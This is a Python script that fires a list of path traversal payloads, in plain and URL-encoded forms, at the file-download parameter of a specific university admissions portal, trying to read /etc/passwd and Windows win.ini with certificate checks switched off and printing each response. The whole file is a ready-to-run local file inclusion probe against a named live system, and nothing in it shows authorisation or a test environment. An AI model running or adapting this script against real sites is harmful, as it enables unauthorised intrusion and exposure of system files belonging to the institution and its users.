import requests

BASE_URL = "https://portals.au.edu.pk/ADMISSIONS_TEST/Accounts/DownloadImportantDocuments"
HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*"
}

# Common traversal payloads targeting both Windows and Linux
payloads = [
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..\\..\\..\\..\\Windows\\win.ini",
    "..\\..\\..\\..\\..\\Windows\\win.ini",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\Windows\\win.ini",
    "....//....//etc/passwd",
    "....\\\\....\\\\Windows\\\\win.ini",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%5c..%5c..%5c..%5cWindows%5cwin.ini",
]

def test_lfi(payload):
    params = {"selectedfilename": payload}
    try:
        r = requests.get(BASE_URL, headers=HEADERS, params=params, timeout=10, verify=False)
        snippet = r.text[:200].replace("\n", "\\n")
        print(f"[{r.status_code}] payload={payload} → length={len(r.text)} snippet={snippet!r}")
    except Exception as e:
        print(f"[ERROR] payload={payload} → {e}")

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()  # suppress insecure-HTTPS warnings
    for p in payloads:
        test_lfi(p)
